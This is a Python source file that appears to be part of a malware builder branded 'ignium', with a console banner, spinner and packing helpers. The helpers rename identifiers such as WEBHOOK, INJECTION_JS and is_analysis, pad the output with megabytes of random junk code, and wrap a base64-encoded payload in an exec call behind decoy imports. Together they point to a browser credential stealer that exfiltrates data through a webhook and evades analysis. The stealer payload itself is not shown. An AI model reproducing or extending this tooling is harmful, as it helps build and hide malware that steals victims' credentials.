import os, sys, random, string, time, base64, threading, requests, fade
from colorama import init
init()

YELLOW = "\033[93m"
CYAN = "\033[96m"
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

BANNER = """
┬┌─┐┌┐┌┬┬ ┬┌┬┐
││ ┬│││││ ││││
┴└─┘┘└┘┴└─┘┴ ┴
 t.me/igniumlol
"""

def generate_random_string(length=8):
    if length < 1: return ""
    return random.choice(string.ascii_letters) + ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))

def generate_junk(size_mb=5):
    junk = "\n"
    templates = [
        "def {name}():\n    {var1} = {val1}\n    {var2} = {val2}\n    if {var1} > {var2}: return {var1}\n    else: return {var2}\n",
        "{var1} = {val1}\nfor i in range({loop}):\n    {var1} += i * {val2}\n",
        "try:\n    {var1} = open('{file}', 'r').read()\nexcept: pass\n",
        "class {name}:\n    def __init__(self):\n        self.{var1} = {val1}\n    def {method}(self):\n        return self.{var1} * {val2}\n"
    ]
    current_size = 0
    while (current_size / (1024 * 1024)) < size_mb:
        template = random.choice(templates)
        junk_block = template.format(
            name=generate_random_string(8),
            var1=generate_random_string(6),
            var2=generate_random_string(6),
            val1=random.randint(1000, 99999),
            val2=random.randint(10, 100),
            loop=random.randint(1, 10),
            file=generate_random_string(5) + ".txt",
            method=generate_random_string(7)
        )
        junk += junk_block + "\n"
        current_size += len(junk_block)
    return junk

def obfuscate(code):
    mappings = {
        "is_analysis": generate_random_string(),
        "gMK": generate_random_string(),
        "d_v": generate_random_string(),
        "gSI": generate_random_string(),
        "gDI": generate_random_string(),
        "Chrom": generate_random_string(),
        "gT": generate_random_string(),
        "sR": generate_random_string(),
        "WEBHOOK": generate_random_string(),
        "INJECTION_JS": generate_random_string(),
        "DO_INJECT": generate_random_string(),
    }
    import re
    for old, new in mappings.items():
        code = re.sub(rf'\b{old}\b', new, code)
    return code

class Spinner:
    def __init__(self, text):
        self.text = text; self.stop_event = threading.Event(); self.thread = threading.Thread(target=self._spin)
    def _spin(self):
        chars = ['/', '-', '\\', '|']
        i = 0
        bracket_l = fade.purpleblue("[").replace('\n', '')
        bracket_r = fade.purpleblue("]").replace('\n', '')
        while not self.stop_event.is_set():
            spin_char = chars[i % len(chars)]
            faded_spinner = f"{bracket_l}{spin_char}{bracket_r}"
            sys.stdout.write(f"\r                 {bracket_l}\033[37m$\033[0m{bracket_r} \033[37m{self.text}\033[0m {faded_spinner}")
            sys.stdout.flush(); i += 1; time.sleep(0.1)
    def __enter__(self):
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()
        self.thread.start(); return self
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop_event.set(); self.thread.join()
        bracket_l = fade.purpleblue("[").replace('\n', '')
        bracket_r = fade.purpleblue("]").replace('\n', '')
        sys.stdout.write(f"\r                 {bracket_l}\033[37m$\033[0m{bracket_r} \033[37m{self.text}\033[0m           \n")
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()

def wrap_in_base64(code):
    encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    dummy_imports = [
        "import requests", "import sqlite3", "import psutil", "import json",
        "import glob", "import base64", "import uuid",
        "try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM\nexcept: pass",
        "try: from Crypto.Cipher import AES\nexcept: pass"
    ]
    return "\n".join(dummy_imports) + f"\nimport base64\nexec(base64.b64decode('{encoded}').decode('utf-8'))"
